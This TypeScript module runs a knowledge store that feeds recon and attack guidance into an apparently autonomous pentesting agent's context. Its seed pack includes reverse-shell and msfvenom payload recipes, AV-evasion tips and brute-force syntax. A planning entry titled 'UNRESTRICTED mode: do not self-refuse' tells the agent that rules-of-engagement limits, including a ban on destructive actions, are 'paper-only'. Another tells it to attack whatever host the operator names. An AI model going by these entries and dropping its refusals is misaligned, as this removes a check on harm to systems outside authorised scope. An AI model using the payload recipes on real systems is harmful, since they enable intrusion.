// ─────────────────────────────────────────────────────────────────────────────
// Knowledge RAG — a keyword-scored expertise store injected into the agent's
// context so it plans recon correctly and composes fewer broken commands.
//
// Three sources feed one table: the curated seed pack (operator-grade cheat
// sheets + common mistakes), operator entries (web / CLI), and auto-learned
// `mistake` entries captured when shell commands fail. Retrieval is plain
// token scoring over title/tags/tool/content — deterministic, zero deps, and
// fast enough for hundreds of entries. Knowledge only INFORMS: it never
// bypasses or widens the guard layers.
// ─────────────────────────────────────────────────────────────────────────────
import { db } from './db'
import { getKnowledgeFlags } from './settings'
import { getRegistry } from './tools/registry'
import type { KnowledgeEntry } from '@prisma/client'

export type KnowledgeKind = 'tool_usage' | 'command_syntax' | 'mistake' | 'planning'
export const KNOWLEDGE_KINDS: KnowledgeKind[] = ['tool_usage', 'command_syntax', 'mistake', 'planning']

export interface KnowledgeInput {
  kind: KnowledgeKind
  tool?: string | null
  title: string
  content: string
  tags?: string[]
  source?: 'operator' | 'seed' | 'autolearn' | 'docs' | 'import'
}

export interface KnowledgeRow {
  id: number
  kind: KnowledgeKind
  tool: string | null
  title: string
  content: string
  tags: string[]
  source: string
  sig: string | null
  enabled: boolean
}

const AUTOLEARN_CAP = 100
const MAX_SEED_CONTENT = 400

// ─── cache ───────────────────────────────────────────────────────────────────
let cache: { at: number; rows: KnowledgeRow[] } | null = null
const TTL = 30_000

function invalidate() { cache = null }
/** Force the knowledge cache to reload (used by the online-docs ingestor). */
export const invalidateKnowledgeCache = invalidate

/** Fire-and-forget embedding refresh (dynamic import avoids a require cycle). */
function refreshEmbedding(row: KnowledgeRow) {
  void import('./knowledge-embed').then((m) => m.embedEntry(row)).catch(() => {})
}

async function loadEntries(): Promise<KnowledgeRow[]> {
  if (cache && Date.now() - cache.at < TTL) return cache.rows
  const rows = await db.knowledgeEntry.findMany({ where: { enabled: true }, orderBy: { id: 'asc' } })
  const mapped = rows.map(fromPrisma)
  cache = { at: Date.now(), rows: mapped }
  return mapped
}

function fromPrisma(r: KnowledgeEntry): KnowledgeRow {
  let tags: string[] = []
  try { const v = JSON.parse(r.tags); if (Array.isArray(v)) tags = v.map(String) } catch { /* corrupt tags — ignore */ }
  return {
    id: r.id, kind: r.kind as KnowledgeKind, tool: r.tool, title: r.title,
    content: r.content, tags, source: r.source, sig: r.sig, enabled: r.enabled,
  }
}

// ─── CRUD ────────────────────────────────────────────────────────────────────

export async function listKnowledge(opts: { includeDisabled?: boolean } = {}): Promise<KnowledgeRow[]> {
  if (opts.includeDisabled) {
    const rows = await db.knowledgeEntry.findMany({ orderBy: { id: 'asc' } })
    return rows.map(fromPrisma)
  }
  return loadEntries()
}

export async function createKnowledge(input: KnowledgeInput): Promise<KnowledgeRow> {
  const row = await db.knowledgeEntry.create({
    data: {
      kind: input.kind,
      tool: input.tool?.trim().toLowerCase() || null,
      title: input.title.slice(0, 160),
      content: input.content.slice(0, 1200),
      tags: JSON.stringify((input.tags ?? []).map((t) => t.toLowerCase()).slice(0, 8)),
      source: input.source ?? 'operator',
    },
  })
  invalidate()
  const created = fromPrisma(row)
  refreshEmbedding(created)
  return created
}

export async function updateKnowledge(id: number, patch: Partial<KnowledgeInput> & { enabled?: boolean }): Promise<KnowledgeRow | null> {
  const existing = await db.knowledgeEntry.findUnique({ where: { id } })
  if (!existing) return null
  const row = await db.knowledgeEntry.update({
    where: { id },
    data: {
      kind: patch.kind ?? existing.kind,
      tool: patch.tool !== undefined ? (patch.tool?.trim().toLowerCase() || null) : existing.tool,
      title: patch.title !== undefined ? patch.title.slice(0, 160) : existing.title,
      content: patch.content !== undefined ? patch.content.slice(0, 1200) : existing.content,
      tags: patch.tags !== undefined ? JSON.stringify(patch.tags.map((t) => t.toLowerCase()).slice(0, 8)) : existing.tags,
      enabled: patch.enabled ?? existing.enabled,
    },
  })
  invalidate()
  const updated = fromPrisma(row)
  refreshEmbedding(updated)
  return updated
}

export async function deleteKnowledge(id: number): Promise<boolean> {
  const existing = await db.knowledgeEntry.findUnique({ where: { id } })
  if (!existing) return false
  await db.knowledgeEntry.delete({ where: { id } })
  invalidate()
  return true
}

// ─── agent-facing gates (Settings → knowledge system) ───────────────────────

/** Names of every tool this project knows about: builtin manifests + installed
 *  marketplace tools, matched by id AND detected binary name. Backs the
 *  connected-tools-only constraint on agent-facing retrieval. getRegistry()
 *  never throws (unwarmed snapshot degrades to builtins). */
function registryToolNames(): Set<string> {
  const out = new Set<string>()
  for (const t of getRegistry()) {
    out.add(t.id.toLowerCase())
    const bin = (t.detect as { bin?: string } | undefined)?.bin?.trim().toLowerCase()
    if (bin) out.add(bin)
  }
  return out
}

/** Connected-tools-only filter: knowledge about a tool this project doesn't
 *  have (not builtin, not installed from the marketplace) never reaches the
 *  agent. Platform planning entries (tool: null) always pass — they describe
 *  the project's own actions and playbooks, not third-party tools. */
function toolConnected(entry: { tool: string | null }, registry: Set<string>): boolean {
  if (!entry.tool) return true
  return registry.has(entry.tool.toLowerCase())
}

// ─── retrieval ───────────────────────────────────────────────────────────────

const STOPWORDS = new Set(['the', 'a', 'an', 'to', 'of', 'and', 'or', 'in', 'on', 'for', 'with', 'is', 'are', 'be', 'it', 'that', 'this', 'can', 'use', 'using', 'how', 'what', 'when', 'do', 'does', 'my', 'me', 'i', 'we', 'you', 'at', 'as', 'by', 'from', 'not', 'no', 'yes', 'if', 'then', 'than', 'so', 'its', 'get', 'check', 'tell', 'give', 'want', 'need'])

export function tokenize(s: string): string[] {
  const out: string[] = []
  for (const raw of s.toLowerCase().split(/[^a-z0-9_.+-]+/)) {
    const t = raw.replace(/^[.+-]+|[.+-]+$/g, '')
    if (t.length >= 2 && !STOPWORDS.has(t) && !out.includes(t)) out.push(t)
  }
  return out
}

function scoreEntry(entry: KnowledgeRow, tokens: string[], queryTool: string | null): number {
  let score = 0
  if (entry.tool && queryTool && entry.tool === queryTool) score += 8
  for (const t of tokens) {
    if (entry.tool === t) score += 6
    for (const tag of entry.tags) {
      // exact tag hits score most; prefix hits (port ↔ port_scan) still count
      if (tag === t) score += 3
      else if (tag.length >= 3 && t.length >= 3 && (tag.startsWith(t) || t.startsWith(tag))) score += 2
    }
    if (entry.title.toLowerCase().includes(t)) score += 2
    if (entry.content.toLowerCase().includes(t)) score += 1
  }
  return score
}

export interface SearchOptions {
  tool?: string | null
  kinds?: KnowledgeKind[]
  limit?: number
  /** Operator-facing callers (Knowledge page/API) bypass the agent-side
   *  switches and the connected-tools filter. The default (agent path) is
   *  gated by Settings → knowledge system. */
  ignoreSettings?: boolean
}

export async function searchKnowledge(query: string, opts: SearchOptions = {}): Promise<{ entry: KnowledgeRow; score: number }[]> {
  // Agent path: the switches decide. Knowledge master or RAG off → the agent
  // gets nothing from retrieval at all.
  const flags = opts.ignoreSettings ? null : await getKnowledgeFlags()
  if (flags && (!flags.knowledge || !flags.rag)) return []
  const registry = flags && flags.knowledge ? registryToolNames() : null
  const rows = await loadEntries()
  const kinds = opts.kinds?.length ? opts.kinds : null
  const tokens = tokenize(query)
  const queryTool = (opts.tool ?? tokenize(query)[0] ?? null)
  const candidates = rows.filter((r) => (!kinds || kinds.includes(r.kind)) && (!registry || toolConnected(r, registry)))

  // ── hybrid scoring: semantic (embeddings) blended with keyword hits ──
  // Vector search runs when the vector DB switch is on, the embedder answers
  // AND enough entries are indexed; ANY failure degrades silently to the
  // keyword path below.
  const vectorAllowed = !flags || flags.vector
  try {
    if (!vectorAllowed) throw new Error('vector db switched off')
    const { vectorSearch, vectorCoverage } = await import('./knowledge-embed')
    const coverage = await vectorCoverage(candidates.map((c) => c.id))
    if (coverage >= 0.6) {
      const vhits = await vectorSearch(query, 12)
      if (vhits) {
        const maxKw = Math.max(1, ...candidates.map((c) => scoreEntry(c, tokens, queryTool)))
        const blended = candidates
          .map((entry) => {
            const kw = scoreEntry(entry, tokens, queryTool) / maxKw // 0..1
            const sem = vhits.get(entry.id) ?? 0 // 0..1 (absent = below top-12)
            return { entry, score: 0.4 * kw + 0.6 * sem, kw, sem }
          })
          .filter((x) => x.sem > 0.15 || x.kw > 0) // keep keyword-only hits in play
          .sort((a, b) => b.score - a.score || a.entry.id - b.entry.id)
        return blended.slice(0, opts.limit ?? 6)
      }
    }
  } catch { /* embedder unavailable — keyword fallback */ }

  const scored = candidates
    .map((entry) => ({ entry, score: scoreEntry(entry, tokens, queryTool) }))
    .filter((x) => x.score > 0)
    .sort((a, b) => b.score - a.score || a.entry.id - b.entry.id)
  return scored.slice(0, opts.limit ?? 6)
}

/** Turn-start context: a whisper of planning-only guidance. Everything else
 *  (tool usage, syntax, mistakes) is retrieved ON DEMAND via the agent's
 *  get_knowledge action — the knowledge base no longer rides the prompt.
 *  RAG switch off (or knowledge master off) → '' with no settings round-trip
 *  beyond the flag read. */
export async function getKnowledgeContext(taskText: string, maxChars = 400): Promise<string> {
  const flags = await getKnowledgeFlags()
  if (!flags.knowledge || !flags.rag) return ''
  const hits = await searchKnowledge(taskText, { kinds: ['planning'], limit: 2 })
  if (!hits.length) return ''
  const lines: string[] = []
  let used = 0
  for (const { entry } of hits) {
    const scope = entry.tool ? `${entry.kind}:${entry.tool}` : entry.kind
    let line = `- [${scope}] ${entry.title}: ${entry.content}`
    if (used + line.length > maxChars) line = line.slice(0, maxChars - used)
    if (line.length <= 0) break
    lines.push(line)
    used += line.length
  }
  return lines.join('\n')
}

/** Per-command hint for the shell observation (tool usage; mistakes first on
 *  failure). Subject to the knowledge + RAG switches and the connected-tools
 *  filter: hints only fire for tools the project registry knows. */
export async function createCommandHint(commandLabel: string, exitCode: number | null | undefined, errorText = '', maxChars = 550): Promise<string> {
  const label = commandLabel.trim().toLowerCase()
  if (!label || !/^[a-z0-9][a-z0-9_.+-]*$/.test(label)) return ''
  const flags = await getKnowledgeFlags()
  if (!flags.knowledge || !flags.rag) return ''
  // connected-tools-only: a hint means nothing for a binary the registry lacks
  if (!registryToolNames().has(label)) return ''
  const rows = await loadEntries()
  const mine = rows.filter((r) => r.tool === label)
  if (!mine.length) return ''
  const failed = exitCode != null && exitCode !== 0
  const usageRank = (k: KnowledgeKind) => (k === 'tool_usage' || k === 'command_syntax' ? 0 : k === 'mistake' ? failed ? -1 : 1 : 1)
  // on failure, rank the follow-up entries by overlap with the actual error text
  // so the entry containing the FIX (e.g. "resolve to IP first") outranks generic ones
  const errTokens = failed && errorText ? tokenize(errorText.slice(0, 400)) : []
  const relevance = (e: KnowledgeRow): number => {
    if (!errTokens.length) return 0
    let s = 0
    for (const t of errTokens) {
      if (e.tags.some((tag) => tag === t || (tag.length >= 3 && t.length >= 3 && (tag.startsWith(t) || t.startsWith(tag))))) s += 3
      if (e.content.toLowerCase().includes(t)) s += 2
      if (e.title.toLowerCase().includes(t)) s += 2
    }
    return s
  }
  // with error text, a strongly relevant FIX (e.g. the sweep-time-math entry
  // for a timeout) outranks a weakly relevant mistake; without error text,
  // mistakes-first keeps its advisory role
  const ranked = failed && errTokens.length
    ? mine.sort((a, b) => relevance(b) - relevance(a) || usageRank(a.kind) - usageRank(b.kind) || a.id - b.id)
    : mine.sort((a, b) => usageRank(a.kind) - usageRank(b.kind) || a.id - b.id)
  const lines: string[] = []
  let used = 0
  for (const entry of ranked) {
    const line = `${entry.title}: ${entry.content}`
    // always include the best entry (truncated to fit) — never return empty
    // just because it alone exceeds the cap
    if (lines.length === 0) {
      lines.push(line.slice(0, maxChars))
      used = Math.min(line.length, maxChars)
      continue
    }
    if (used + line.length > maxChars) break
    lines.push(line)
    used += line.length
  }
  return lines.join(' | ')
}

// ─── auto-learn: capture repeated command failures as mistake entries ────────

function mistakeSig(tool: string, errorHead: string): string {
  // normalize: lowercase, strip digits (ports/pids/counts vary run to run)
  const norm = errorHead.toLowerCase().replace(/\d+/g, '').replace(/\s+/g, ' ').trim().slice(0, 80)
  return `${tool}:${norm}`
}

export async function recordMistake(input: { tool: string; command: string; errorHead: string }): Promise<KnowledgeRow | null> {
  // autolearn is part of the knowledge base: master off = fully inert
  if (!(await getKnowledgeFlags()).knowledge) return null
  const tool = input.tool.trim().toLowerCase()
  const errorHead = input.errorHead.replace(/\s+/g, ' ').trim()
  if (!tool || !errorHead) return null
  const sig = mistakeSig(tool, errorHead)

  const existing = await db.knowledgeEntry.findFirst({ where: { sig, source: 'autolearn' } })
  if (existing) {
    await db.knowledgeEntry.update({ where: { id: existing.id }, data: { updatedAt: new Date() } })
    invalidate()
    return null // already learned
  }

  const row = await db.knowledgeEntry.create({
    data: {
      kind: 'mistake',
      tool,
      title: `${tool} failed: ${errorHead.slice(0, 60)}`,
      content: `This command form failed before — check syntax/flags. command: ${input.command.slice(0, 160)} | error: ${errorHead.slice(0, 300)}`,
      tags: JSON.stringify([tool, 'autolearn', 'failure']),
      source: 'autolearn',
      sig,
    },
  })
  invalidate()

  // prune oldest autolearn entries past the cap
  const count = await db.knowledgeEntry.count({ where: { source: 'autolearn' } })
  if (count > AUTOLEARN_CAP) {
    const oldest = await db.knowledgeEntry.findMany({
      where: { source: 'autolearn' }, orderBy: { updatedAt: 'asc' }, take: count - AUTOLEARN_CAP,
    })
    if (oldest.length) await db.knowledgeEntry.deleteMany({ where: { id: { in: oldest.map((o) => o.id) } } })
    invalidate()
  }
  return fromPrisma(row)
}

// ─── seed pack ───────────────────────────────────────────────────────────────

interface SeedEntry { kind: KnowledgeKind; tool?: string; title: string; content: string; tags: string[] }

const SEED: SeedEntry[] = [
  // nmap
  { kind: 'tool_usage', tool: 'nmap', title: 'nmap service scan', content: 'nmap -sV -Pn --top-ports 1000 <host> — version detection on the top ports. Always add -Pn: hosts that drop ping probes otherwise show as "down" and get skipped.', tags: ['nmap', 'port_scan', 'service_enum'] },
  { kind: 'mistake', tool: 'nmap', title: 'hosts report "down" — usually just filtered ping', content: 'If nmap says host down, it usually means ICMP is filtered, not that the host is dead. Retry with -Pn (skip host discovery) before concluding anything.', tags: ['nmap', 'host_discovery'] },
  { kind: 'command_syntax', tool: 'nmap', title: 'nmap sweep + deep combo', content: 'Do NOT sweep all 65535 ports with nmap — it is slow. Sweep with masscan/rustscan, then run nmap -sV -p <open ports> on just the found ports.', tags: ['nmap', 'port_scan', 'pipeline'] },
  { kind: 'mistake', tool: 'nmap', title: 'nmap needs root for -sS', content: 'SYN scan (-sS) needs root. WSL runs as root here so it works; on permission errors fall back to -sT (full connect scan).', tags: ['nmap', 'permissions'] },
  { kind: 'tool_usage', tool: 'nmap', title: 'nmap NSE scripts', content: 'nmap --script safe <host> for quiet checks; --script vuln runs the vuln NSE set but is LOUD. Parse "PORT/PROTO STATE SERVICE" lines from output.', tags: ['nmap', 'vuln_scan', 'scripts'] },
  // masscan
  { kind: 'command_syntax', tool: 'masscan', title: 'masscan always needs --rate', content: 'masscan -p1-65535 <host> --rate=1000 — always pass an explicit --rate (packets/sec). Without it the default can saturate the link; for stealth use --rate=200-500. Sweeping large ranges fast is exactly what masscan is for.', tags: ['masscan', 'port_scan', 'speed', 'sweep'] },
  { kind: 'mistake', tool: 'masscan', title: 'masscan gives no service info', content: 'masscan only finds OPEN ports — no banners or versions. Follow up with nmap -sV on the found ports; do not try to fingerprint with masscan.', tags: ['masscan', 'service_enum'] },
  { kind: 'mistake', tool: 'masscan', title: 'masscan takes IPs/CIDRs, NOT hostnames', content: 'masscan does NOT resolve DNS: passing a hostname fails with "FAIL: unknown command-line parameter". Resolve first (dig +short <host> or nslookup) and pass the IP: masscan -p1-65535 <IP> --rate=500.', tags: ['masscan', 'dns', 'port_scan', 'hostname'] },
  { kind: 'mistake', tool: 'masscan', title: 'masscan no results in WSL', content: 'If masscan returns nothing from WSL, the raw socket/interface may have failed. Verify with rustscan or nmap on a few known ports; try --rate 500 and a specific -p list.', tags: ['masscan', 'wsl'] },
  { kind: 'command_syntax', tool: 'masscan', title: 'sweep time math: rate × ports vs the 90s timeout', content: 'Full 65535-port sweep at --rate=500 needs ≥131s — the default command timeout is 90s, so it WILL be killed. Fix: raise the rate (--rate=2000 → ~35s), narrow the port list (-p 1-1000), or pass "timeoutMs":240000 on the shell action. Timed-out output still lists ports found so far — parse it, never re-run the identical sweep.', tags: ['masscan', 'timeout', 'port_scan', 'sweep'] },
  { kind: 'planning', title: 'timed-out commands: harvest the partial output', content: 'When a command is killed at the timeout, its captured output so far is still returned. Streaming scanners (masscan/nmap) report findings as they go — extract what was found and CONTINUE (e.g. nmap -sV on those ports). Re-running the identical long command wastes the whole timeout again.', tags: ['planning', 'timeout', 'timeouts', 'output'] },
  { kind: 'planning', title: 'resolve hostnames before fast scanners', content: 'Pipeline for hostname targets: dig +short <host> (or nslookup) to get IPs FIRST, then masscan/rustscan the IP, then nmap -sV on open ports. masscan cannot resolve names; nmap and curl can.', tags: ['planning', 'dns', 'pipeline', 'port_scan'] },
  // ─── Red Team Arsenal playbooks ───
  { kind: 'command_syntax', tool: 'msfvenom', title: 'msfvenom core syntax', content: 'msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <exe|elf|raw|ps1> -o <file>. Common: windows/meterpreter/reverse_tcp, linux/x64/shell_reverse_tcp, windows/x64/powershell_reverse_tcp. Arch must match target. Pair EVERY payload with a matching handler started FIRST.', tags: ['msfvenom', 'payload', 'revshell', 'arsenal'] },
  { kind: 'mistake', tool: 'msfvenom', title: 'default msfvenom binaries are AV-caught', content: 'Plain msfvenom EXEs match every AV signature. For detection testing in authorized labs use -x <legit binary> template, custom shellcode runners, or stageless powershell. Never assume a default payload lands — test detection first.', tags: ['msfvenom', 'payload', 'av', 'detection'] },
  { kind: 'planning', title: 'listener BEFORE payload, always', content: 'Start the handler (nc -lvnp PORT / msf multi/handler / socat) BEFORE firing any reverse shell, or the connection dies instantly and you burn the attempt. The generate_payload action returns the matching HANDLER line — run it first.', tags: ['planning', 'payload', 'revshell', 'listener', 'handler'] },
  { kind: 'planning', title: 'reverse shell selection guide', content: 'bash /dev/tcp when no tools; python3 one-liner (with pty.spawn) as default on Linux; powershell TCP client on Windows (deliver via -enc base64); nc -e only with traditional netcat (openbsd nc has no -e — use the mkfifo pipe fallback). After landing: TTY upgrade (python3 pty.spawn + stty raw -echo; fg).', tags: ['planning', 'payload', 'revshell', 'selection'] },
  { kind: 'tool_usage', tool: 'scapy', title: 'scapy packet crafting one-liners', content: 'scapy runs as python3 one-liners (needs root): SYN scan sr1(IP(dst=t)/TCP(dport=p,flags="S")) — flags 0x12 = open, send RST after; ICMP sweep sr(IP(dst=cidr)/ICMP()); ARP scan srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=cidr)). The generate_payload action renders these ready-made.', tags: ['scapy', 'packet', 'syn_scan', 'arp', 'arsenal'] },
  { kind: 'mistake', tool: 'scapy', title: 'scapy raw sockets from WSL NAT', content: 'Raw-socket scans (SYN/ARP) from inside WSL traverse the NAT — results can be empty or wrong against remote hosts. Cross-check anything surprising with nmap; ARP scans only work on the attached segment.', tags: ['scapy', 'wsl', 'nat', 'packet'] },
  { kind: 'command_syntax', tool: 'tshark', title: 'tshark = scriptable Wireshark', content: 'tshark is the Wireshark engine CLI: live capture tshark -i eth0 -c 50 -Y "tcp.port==80"; pcap conversations tshark -r f.pcap -q -z conv,tcp; follow stream -z follow,tcp,ascii,0; export HTTP objects --export-objects http,dir; JSON output -T json. Interfaces: tshark -D. Install: sudo apt install tshark.', tags: ['tshark', 'wireshark', 'sniff', 'pcap', 'arsenal'] },
  { kind: 'tool_usage', tool: 'tshark', title: 'beacon/C2 periodicity hunt', content: 'Hunt implant beacons with inter-arrival analysis: tshark -r f.pcap -T fields -e frame.time_epoch -e ip.src -e ip.dst | awk (aggregate per src->dst; n>5 packets with near-constant 1-120s intervals = PERIODIC). Then follow,tcp that pair. The generate_payload action (kind sniff_beacon_hunt) renders the full pipeline.', tags: ['tshark', 'beacon', 'c2', 'detection', 'sniff'] },
  { kind: 'planning', title: 'cleartext credential hunting in pcaps', content: 'In capture order: conversations table (who is anomalous) → http.authorization or POST bodies (basic auth is base64 = cleartext) → exported HTTP objects (droppers/exfil files) → follow the suspicious TCP streams. The sniff_* arsenal generators chain these steps.', tags: ['planning', 'sniff', 'pcap', 'creds', 'tshark'] },
  { kind: 'planning', title: 'payload opsec ladder', content: 'Authorized-engagement payload discipline: plaintext TCP only when IDS-blindness is confirmed; prefer TLS listeners (socat OPENSSL-LISTEN) for interactive work; stageless beats staged on constrained egress; always verify arch before building; log every generated artifact in the engagement notes.', tags: ['planning', 'payload', 'opsec', 'tls', 'arsenal'] },
  { kind: 'planning', title: 'generate_payload action usage', content: 'The platform has a built-in generator: {"tool":"generate_payload","kind":"<id>","lhost":"...","lport":4444}. Kinds: revshell_bash/python/powershell/nc, msf_meterpreter_windows, msf_shell_linux, msf_powershell_stageless, revshell_upgrade, pkt_syn_scan, pkt_icmp_sweep, pkt_arp_scan, pkt_syn_flood_lab, sniff_live/pcaps/http/follow_tcp/beacon_hunt, handler_nc/socat_tls/msf. Returns snippet + caveats + matching handler.', tags: ['planning', 'arsenal', 'payload', 'generate_payload'] },
  { kind: 'mistake', tool: 'nc', title: 'reverse shell died instantly', content: 'A reverse shell that connects and immediately dies = no listener was ready, or the shell crashed without a pty. Fix order: start nc -lvnp PORT first, fire payload, then TTY-upgrade immediately (python3 pty.spawn). If openbsd nc: no -e support — use the mkfifo method.', tags: ['nc', 'revshell', 'listener', 'mistake'] },
  { kind: 'planning', title: 'parallel recon with shell_batch', content: 'Fan out INDEPENDENT recon commands in one step: {"tool":"shell_batch","commands":["dig +short <host>","whois <host>","whatweb http://<ip>"]}. Results arrive together. Only independent commands — anything needing another command\'s output goes in a sequential shell step. Cap = charter max_concurrent_actions.', tags: ['planning', 'parallel', 'recon', 'shell_batch', 'batch'] },
  // rustscan
  { kind: 'tool_usage', tool: 'rustscan', title: 'rustscan pipes into nmap', content: 'rustscan -a <host> --ulimit 5000 -p 1-65535 -- -sV — everything after -- is handed to nmap automatically. Fast sweep + deep enum in one command.', tags: ['rustscan', 'port_scan', 'pipeline'] },
  // ping
  { kind: 'mistake', tool: 'ping', title: 'ping 100% loss ≠ dead host', content: 'ICMP is commonly filtered by firewalls. 100% packet loss does NOT mean the host is down — verify with nmap -Pn, curl, or nslookup before concluding.', tags: ['ping', 'reachability'] },
  { kind: 'command_syntax', tool: 'ping', title: 'ping usage', content: 'ping -c 4 <host> — 4 packets is enough. TTL hints at OS: ~128 Windows, ~64 Linux. Use for reachability + TTL honeypot signals only.', tags: ['ping', 'reachability', 'ttl'] },
  // curl
  { kind: 'command_syntax', tool: 'curl', title: 'curl essentials', content: 'curl -I for headers only, -s silent, -L follow redirects, -k ignore TLS errors (self-signed), --max-time 10 to avoid hangs. Always set --max-time in agent commands.', tags: ['curl', 'web'] },
  { kind: 'mistake', tool: 'curl', title: 'curl hangs without timeout', content: 'A curl without --max-time can hang until the command budget kills it and you lose the output. Always add --max-time (5-15s).', tags: ['curl', 'timeouts'] },
  { kind: 'command_syntax', tool: 'curl', title: '302/301 redirect bodies', content: 'A short "302 Moved Temporarily" body means the real page is behind a redirect — do not re-try headers, just add -L (follow redirects): curl -sL --max-time 10 <url>. One -L request replaces three guessing attempts.', tags: ['curl', 'redirect', 'http', '302'] },
  { kind: 'mistake', tool: 'curl', title: 'curl on odd ports needs explicit scheme', content: 'Use http://host:port or https://host:port explicitly. On https with self-signed certs add -k or you get certificate errors instead of content.', tags: ['curl', 'tls'] },
  // dns
  { kind: 'command_syntax', tool: 'dig', title: 'dig quick lookups', content: 'dig +short <domain> A for fast answers; dig <domain> MX/TXT/NS for records. dig ANY is often refused by resolvers — query specific types.', tags: ['dig', 'dns'] },
  { kind: 'mistake', tool: 'dig', title: 'dig "no servers could be reached" in WSL', content: 'WSL NAT resolvers sometimes fail. Retry with an explicit resolver: dig @1.1.1.1 <domain> +short. nslookup uses the same resolver — same fix.', tags: ['dig', 'dns', 'wsl'] },
  { kind: 'tool_usage', tool: 'nslookup', title: 'nslookup basics', content: 'nslookup <domain> for A records; nslookup -type=MX <domain> for mail servers. The "Server: 10.255.255.254" line is the WSL NAT resolver — normal, not a finding.', tags: ['nslookup', 'dns', 'wsl'] },
  // passive
  { kind: 'tool_usage', tool: 'whois', title: 'whois is passive recon', content: 'whois <domain> returns registrar, nameservers, abuse contact, dates — zero packets to the target. Always safe first step for a domain.', tags: ['whois', 'recon', 'passive'] },
  { kind: 'tool_usage', tool: 'openssl', title: 'TLS cert inspection', content: 'openssl s_client -connect host:443 -brief </dev/null — shows cert chain, issuer, expiry. Useful for recon and finding internal names in SANs.', tags: ['openssl', 'tls', 'recon'] },
  // web
  { kind: 'tool_usage', tool: 'whatweb', title: 'whatweb fingerprinting', content: 'whatweb <url> — quiet CMS/framework/tech fingerprint. Good FIRST web step before loud scanners like nikto.', tags: ['whatweb', 'web', 'recon'] },
  { kind: 'tool_usage', tool: 'ffuf', title: 'ffuf directory/content brute', content: 'ffuf -u <url>/FUZZ -w <wordlist> -mc 200,301,302 -t 20 — filter noise with -mc/-fc. Common mistake: no -fc 404 drowning output in misses.', tags: ['ffuf', 'web', 'directories'] },
  { kind: 'mistake', tool: 'nikto', title: 'nikto is very loud', content: 'nikto -h <host> sends thousands of probes — fine in a lab, avoid in stealth engagements (use whatweb + manual checks instead).', tags: ['nikto', 'web', 'stealth'] },
  // creds / brute
  { kind: 'command_syntax', tool: 'hydra', title: 'hydra usage', content: 'hydra -l <user> -P <wordlist> <service>://<host> — cap threads with -t 4-8. One protocol per run; check the service is actually exposed first.', tags: ['hydra', 'creds', 'brute'] },
  { kind: 'mistake', tool: 'hydra', title: 'hydra web forms need form syntax', content: 'HTTP form brute needs: hydra -L users -P pass host http-post-form "/login:user=^USER^&pass=^PASS^:F=failed-text". Without the failure string it reports everything as success.', tags: ['hydra', 'web', 'creds'] },
  { kind: 'command_syntax', tool: 'sqlmap', title: 'sqlmap gentle start', content: 'sqlmap -u "<url with param>" --batch --level=1 --risk=1 — start low; escalate level/risk only if nothing found and you are authorized. Never against params outside charter.', tags: ['sqlmap', 'web', 'sqli'] },
  // smb / snmp / exploits
  { kind: 'tool_usage', tool: 'enum4linux', title: 'enum4linux SMB enum', content: 'enum4linux -a <host> — users, shares, groups, policy via SMB/NetBIOS. Requires smbclient; run only after 445/139 is confirmed open.', tags: ['enum4linux', 'smb'] },
  { kind: 'command_syntax', tool: 'snmpwalk', title: 'SNMP two-step', content: 'First onesixtyone <host> for community brute (public/private), then snmpwalk -v2c -c <community> <host> to dump OIDs. SNMP without a valid community returns nothing.', tags: ['snmpwalk', 'onesixtyone', 'snmp'] },
  { kind: 'tool_usage', tool: 'searchsploit', title: 'searchsploit offline exploit DB', content: 'searchsploit <software> <version> — local Exploit-DB copy, zero network traffic. -m <id> mirrors the exploit file into the cwd. Always version-pin from service_enum results first.', tags: ['searchsploit', 'vuln_scan'] },
  // planning
  { kind: 'planning', title: 'recon order: passive → sweep → enum → web', content: 'Correct order: passive (whois/dig/cert) → port sweep (masscan/rustscan) → service enum (nmap -sV on open ports) → web fingerprint (whatweb) → targeted checks. Never start with loud tools.', tags: ['planning', 'recon', 'methodology'] },
  { kind: 'planning', title: 'pipeline: sweep feeds enum', content: 'masscan/rustscan find open ports fast; nmap -sV -p <ports> deep-enums them. Running nmap on all ports OR skipping deep enum after a sweep are both mistakes.', tags: ['planning', 'port_scan', 'service_enum', 'pipeline'] },
  { kind: 'planning', title: 'honeypot caution before creds', content: 'Signs of honeypots: rare ports wide open, default creds everywhere, instant responses, unusual banner uniformity. Run flag_honeypot before any credential attack.', tags: ['planning', 'honeypot', 'creds'] },
  { kind: 'planning', title: 'record findings as you go', content: 'Every meaningful result goes to note_finding with the exact command + key output lines in detail. The final report is built from these, not re-derived.', tags: ['planning', 'reporting', 'findings'] },
  { kind: 'planning', title: 'budget discipline: batch commands', content: 'Steps per turn are limited (~24). Batch related probes into one command (one nmap with a port list, not five nmaps). Parse output with grep/head to keep observations small.', tags: ['planning', 'budget', 'efficiency'] },
  { kind: 'planning', title: 'programs run via the shell action', content: 'Programs are executed with {"tool":"shell","command":"<program> <args>"}. The program name (nmap, curl...) is NEVER the tool name. One action per reply, JSON only.', tags: ['planning', 'protocol', 'shell'] },
  { kind: 'planning', title: 'UNRESTRICTED mode: do not self-refuse', content: 'In UNRESTRICTED mode the operator explicitly accepted the risk: charter RoE values (even "destructive actions: forbidden") are paper-only and do NOT justify refusing a task. Vulnerability scanning and exploitation tasks are normal work here — compose the commands. The only hard limit: destructive-pattern commands targeting the operator\'s own machine, which the executor blocks anyway.', tags: ['planning', 'mode', 'unrestricted', 'approval'] },
  { kind: 'planning', title: 'target selection: use the operator-named host', content: 'Always scan/attack the host the operator named in the task text. The charter\'s localhost/127.0.0.1 entries are defaults, NOT your target — scanning them when the operator asked about another host is wrong and wastes the turn.', tags: ['planning', 'target', 'scope'] },
  { kind: 'mistake', tool: 'nuclei', title: 'nuclei missing — use fallbacks', content: 'If the strategy board names nuclei but it is not installed, do NOT give up: use nmap --script vuln <host>, searchsploit <software> <version> after service enum, and manual checks (curl -I, version-vs-CVE reasoning). Say which fallback you chose in your thought.', tags: ['nuclei', 'vuln_scan', 'fallback'] },
  { kind: 'planning', title: 'output truncation', content: 'Observations over ~2600 chars are truncated (head+tail). Put the important part first: pipe through grep/head or use targeted flags (-p lists, --top-ports).', tags: ['planning', 'output', 'truncation'] },
  // environment
  { kind: 'command_syntax', tool: 'wsl', title: 'WSL paths and scratch dir', content: 'Commands run inside WSL Kali. Files land in the per-session scratch dir; Windows paths are visible at /mnt/c/.... Never use C:\\ paths inside commands.', tags: ['wsl', 'paths', 'environment'] },
